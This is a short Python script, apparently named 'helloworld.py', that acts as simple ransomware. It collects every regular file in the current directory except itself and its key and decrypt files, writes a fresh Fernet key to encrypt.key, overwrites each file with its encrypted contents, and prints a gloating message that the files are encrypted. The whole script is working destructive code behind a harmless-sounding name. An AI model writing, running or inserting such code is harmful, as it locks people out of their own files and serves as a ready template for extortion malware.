import os
from cryptography.fernet import Fernet

filesDir = [] 

for file in os.listdir():
    if file == "helloworld.py" or file == "encrypt.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        filesDir.append(file)
print(filesDir)

key = Fernet.generate_key()

with open("encrypt.key", "wb") as thekey:
    thekey.write(key)

for file in filesDir:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("Congratulation your files are encrypted :) ")